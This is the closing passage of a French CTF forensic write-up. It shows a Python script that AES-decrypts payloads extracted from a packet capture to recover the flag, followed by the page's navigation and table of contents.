<p>En extrayant les données des paquets via la capture .pcap, on tombe effectivement sur le drapeau que l&rsquo;on déchiffre avec le code suivant :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> Crypto.Cipher <span style="color:#ff6ac1">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">__b64d</span>(s):
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> base64<span style="color:#ff6ac1">.</span>b64decode(s<span style="color:#ff6ac1">.</span>encode())<span style="color:#ff6ac1">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(<span style="color:#5af78e">&#34;e8f93d68b1c2d4e9f7a36b5c8d0f1e2a&#34;</span>)
</span></span><span style="display:flex;"><span>iv <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(<span style="color:#5af78e">&#34;1f2d3c4b5a69788766554433221100ff&#34;</span>)
</span></span><span style="display:flex;"><span>HEX<span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(<span style="color:#5af78e">&#34;37e0f8f92c71f1c3f047f43c13725ef1&#34;</span>)
</span></span><span style="display:flex;"><span>encoding <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;utf-8&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">decrypt</span>(crypted) : 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#ff6ac1">=</span> AES<span style="color:#ff6ac1">.</span>new(key, AES<span style="color:#ff6ac1">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Tronquer à un multiple de 16</span>
</span></span><span style="display:flex;"><span>    valid_len <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">len</span>(crypted) <span style="color:#ff6ac1">-</span> (<span style="color:#ff5c57">len</span>(crypted) <span style="color:#ff6ac1">%</span> <span style="color:#ff9f43">16</span>)
</span></span><span style="display:flex;"><span>    raw <span style="color:#ff6ac1">=</span> crypted[:valid_len]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Déchiffrement</span>
</span></span><span style="display:flex;"><span>    cipher <span style="color:#ff6ac1">=</span> AES<span style="color:#ff6ac1">.</span>new(key, AES<span style="color:#ff6ac1">.</span>MODE_CBC, iv)
</span></span><span style="display:flex;"><span>    decrypted <span style="color:#ff6ac1">=</span> cipher<span style="color:#ff6ac1">.</span>decrypt(raw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Suppression du padding PKCS#7</span>
</span></span><span style="display:flex;"><span>    pad_len <span style="color:#ff6ac1">=</span> decrypted[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> pad_len <span style="color:#ff6ac1">&gt;</span> <span style="color:#ff9f43">0</span> <span style="color:#ff6ac1">and</span> pad_len <span style="color:#ff6ac1">&lt;=</span> <span style="color:#ff9f43">16</span>:
</span></span><span style="display:flex;"><span>        decrypted <span style="color:#ff6ac1">=</span> decrypted[:<span style="color:#ff6ac1">-</span>pad_len]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Décodage en UTF-8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">try</span>:
</span></span><span style="display:flex;"><span>        text <span style="color:#ff6ac1">=</span> decrypted<span style="color:#ff6ac1">.</span>decode(<span style="color:#5af78e">&#34;utf-8&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">except</span> UnicodeDecodeError:
</span></span><span style="display:flex;"><span>        text <span style="color:#ff6ac1">=</span> decrypted<span style="color:#ff6ac1">.</span>decode(<span style="color:#5af78e">&#34;utf-8&#34;</span>, errors<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#34;replace&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff5c57">print</span>(decrypt(HEX))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">with</span> <span style="color:#ff5c57">open</span>(<span style="color:#5af78e">&#34;raw_payloads.txt.head&#34;</span>,<span style="color:#5af78e">&#34;r&#34;</span>) <span style="color:#ff6ac1">as</span> f :
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> l <span style="color:#ff6ac1">in</span> f<span style="color:#ff6ac1">.</span>readlines() : 
</span></span><span style="display:flex;"><span>        payload <span style="color:#ff6ac1">=</span> l<span style="color:#ff6ac1">.</span>strip()
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(decrypt(<span style="color:#ff5c57">bytes</span><span style="color:#ff6ac1">.</span>fromhex(payload)))</span></span></code></pre></div></article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">

<div>

</div>

<div>

</div>

</div>





  
  
  
  <div class="flex flex-wrap justify-between">
    <span>
    
      <a href="/docs/ctf/rootmepro2025/collapsed/mission2/" class="flex align-center">
        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
        <span>Mission 2 - SOC</span>
      </a>
    
    </span>
    <span>
    
      <a href="/docs/ctf/rootmepro2025/collapsed/mission4/" class="flex align-center">
        <span>Mission 4 - Pentest</span>
        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
      </a>
    
    </span>
  </div>
  


 
        
  
  <div class="book-comments">

</div>
  
 
        
        
  
 
        
  
  
    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
  

      </footer>

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  
  <aside class="book-toc">
    <div class="book-toc-content">
      
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mission-3--forensic">Mission 3 : Forensic</a>
      <ul>
        <li><a href="#brief-de-mission">Brief de mission</a></li>
        <li><a href="#premiere-recherches">Premiere recherches</a></li>
        <li><a href="#analyse-de-install_npdatesh">Analyse de install_npdate.sh</a></li>
        <li><a href="#decompilation">Decompilation</a></li>
      </ul>
    </li>
  </ul>
</nav>



    </div>
  </aside>
  
 
  </main>

  
</body>
</html>




















